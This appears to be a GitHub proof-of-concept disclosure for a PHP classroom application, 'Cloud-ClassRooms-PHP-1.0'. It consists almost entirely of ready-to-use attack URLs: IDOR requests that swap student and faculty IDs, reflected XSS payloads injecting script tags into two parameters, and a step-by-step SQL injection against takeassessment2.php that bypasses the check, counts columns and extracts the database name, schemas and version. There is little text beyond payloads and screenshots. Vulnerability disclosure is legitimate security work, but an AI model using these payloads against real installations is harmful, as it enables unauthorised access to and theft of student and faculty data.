# Cloud-ClassRooms-PHP-1.0-Poc3

___

# IDOR

Poc:
- /updatedetailsfromstudent.php?eno=146891651#
- /updatedetailsfromstudent.php?eno=146891652#

<img width="1839" height="816" alt="image" src="https://github.com/user-attachments/assets/f6be2239-bacd-4bfc-9002-51b574cae2dc" />

<img width="1841" height="834" alt="image" src="https://github.com/user-attachments/assets/80639b42-cc71-4dec-8a40-f36dda1aa562" />

___

Poc:

- /mydetailsfaculty.php?myfid=102
- /mydetailsfaculty.php?myfid=101

<img width="1854" height="733" alt="image" src="https://github.com/user-attachments/assets/6707bed0-53c8-490c-b20e-5901f86462b4" />

<img width="1800" height="711" alt="image" src="https://github.com/user-attachments/assets/2d2b5f46-9b8c-4330-854e-bdfba9fa82af" />


___

# XSS

Poc:
- /askquery.php?eid="><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>

<img width="1038" height="732" alt="image" src="https://github.com/user-attachments/assets/3c33a43b-084e-4768-8b60-ca1d8712e129" />

<img width="1360" height="188" alt="image" src="https://github.com/user-attachments/assets/8a8b11d7-1b1a-4580-9ff0-31ebc3bdc7a4" />

___


Poc:

- /takeassessment2.php?exid=6"><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>

<img width="1848" height="620" alt="image" src="https://github.com/user-attachments/assets/e9d557d9-a296-48f7-9af3-7ddcab104956" />

<img width="1393" height="221" alt="image" src="https://github.com/user-attachments/assets/49e39a7d-e4d8-4297-ab41-9f2cc4c8641d" />



___

# SQL 

Poc:

- /takeassessment2.php?exid=6%27%20or%201=1--%20-
- /takeassessment2.php?exid=6%27%20ORDER%20BY%201--%20-
- /takeassessment2.php?exid=6%27%20ORDER%20BY%207--%20-
- /takeassessment2.php?exid=6%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20DATABASE()--%20-
- /takeassessment2.php?exid=1%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL,%20schema_name,%20NULL,%20NULL%20FROM%20information_schema.schemata--%20-
- /takeassessment2.php?exid=1%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20VERSION()--%20-

<img width="1787" height="1401" alt="image" src="https://github.com/user-attachments/assets/51e3af4f-e717-4d1b-b058-0ff726592033" />

<img width="1937" height="1293" alt="image" src="https://github.com/user-attachments/assets/f721969e-e883-4356-a6c0-983607c99e19" />

<img width="1869" height="389" alt="image" src="https://github.com/user-attachments/assets/cd39afe5-a9a1-4495-ac71-d2586357f813" />

<img width="1629" height="1153" alt="image" src="https://github.com/user-attachments/assets/8291abdd-68b9-4f6d-80e6-a689f4022d80" />


